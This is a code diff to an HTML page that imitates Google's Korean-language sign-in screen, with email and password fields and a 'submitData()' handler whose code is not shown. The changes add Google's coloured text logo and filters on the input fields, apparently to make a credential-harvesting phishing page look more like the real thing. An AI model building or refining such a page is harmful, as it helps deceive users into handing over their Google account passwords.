@@ -22,7 +22,16 @@
             text-align: center;
             box-sizing: border-box;
         }
-        .logo { margin-bottom: 10px; }
+        .google-text {
+            font-size: 24px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            letter-spacing: -0.5px;
+        }
+        .g1 { color: #4285F4; }
+        .g2 { color: #EA4335; }
+        .g3 { color: #FBBC05; }
+        .g4 { color: #34A853; }
         h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #202124; }
         p { font-size: 16px; color: #202124; margin-bottom: 40px; }
         .input-group { text-align: left; margin-bottom: 24px; }
@@ -56,14 +65,18 @@
 <body>
 
 <div class="login-box">
-    <img src="https://www.google.com" width="75" alt="Google" class="logo">
+    <div class="google-text">
+        <span class="g1">G</span><span class="g2">o</span><span class="g3">o</span><span class="g1">g</span><span class="g4">l</span><span class="g2">e</span>
+    </div>
     <h1>로그인</h1>
     <p>Google 계정 사용</p>
     <div class="input-group">
-        <input type="text" id="email" placeholder="이메일 또는 휴대전화" required>
+        <input type="text" id="email" placeholder="이메일 또는 휴대전화" 
+               oninput="this.value = this.value.replace(/[ㄱ-ㅎ|ㅏ-ㅣ|가-힣]/g, '')" required>
     </div>
     <div class="input-group">
-        <input type="password" id="password" placeholder="비밀번호 입력" required>
+        <input type="password" id="password" placeholder="비밀번호 입력" 
+               oninput="this.value = this.value.replace(/[ㄱ-ㅎ|ㅏ-ㅣ|가-힣]/g, '')" required>
     </div>
     <div class="btn-container">
         <button onclick="submitData()">다음</button>
@@ -112,3 +125,4 @@
 
 </body>
 </html>
+
